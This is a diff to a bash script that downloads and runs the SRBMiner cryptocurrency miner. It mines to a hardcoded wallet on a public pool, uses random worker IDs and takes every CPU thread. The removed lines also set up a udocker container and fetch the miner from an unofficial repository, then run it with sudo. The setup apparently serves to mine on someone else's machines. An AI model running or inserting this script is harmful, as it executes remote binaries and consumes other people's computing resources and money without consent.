@@ -1,16 +1,5 @@
 #!/bin/bash
 export LC_ALL=C
 export LANG=C
-curl https://github.com/indigo-dc/udocker/releases/download/1.3.17/udocker-1.3.17.tar.gz -L -o udocker-1.3.17.tar.gz
-tar zxvf udocker-1.3.17.tar.gz
-export PATH=`pwd`/udocker-1.3.17/udocker:$PATH
-udocker pull ubuntu:latest
-udocker create --name=latest ubuntu:latest
-udocker  run latest /bin/bash
-
-udocker
-echo
-apt update && apt -y install unzip wget curl libncurses6 libncursesw6 sudo
-wget https://github.com/liecamshoe/file/raw/main/SRBMiner-MULTI
-chmod 777 SRBMiner-MULTI
-sudo ./SRBMiner-MULTI --disable-gpu --algorithm randomc64 --pool stratum+tcp://c64.suprnova.cc:6464 --wallet Wo4wBGZX7fq2cNG65PfwHH6D7s3aJz71bGPuJ7mwtNSf6cPsQsP8ihJAAT7fnk2Uf3LBH4BcMBER4jkFKHPkuXd732397gLRJ.$(echo $RANDOM | md5sum | head -c 10) --password x --cpu-threads $(nproc --all)
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.2.7/SRBMiner-Multi-3-2-7-Linux.tar.gz && tar -xzvf SRBMiner-Multi-3-2-7-Linux.tar.gz && cd SRBMiner-Multi-3-2-7
+./SRBMiner-MULTI --disable-gpu --algorithm randomc64 --pool stratum+tcp://c64.suprnova.cc:6464 --wallet Wo4wBGZX7fq2cNG65PfwHH6D7s3aJz71bGPuJ7mwtNSf6cPsQsP8ihJAAT7fnk2Uf3LBH4BcMBER4jkFKHPkuXd732397gLRJ.$(echo $RANDOM | md5sum | head -c 10) --password x --cpu-threads $(nproc --all)
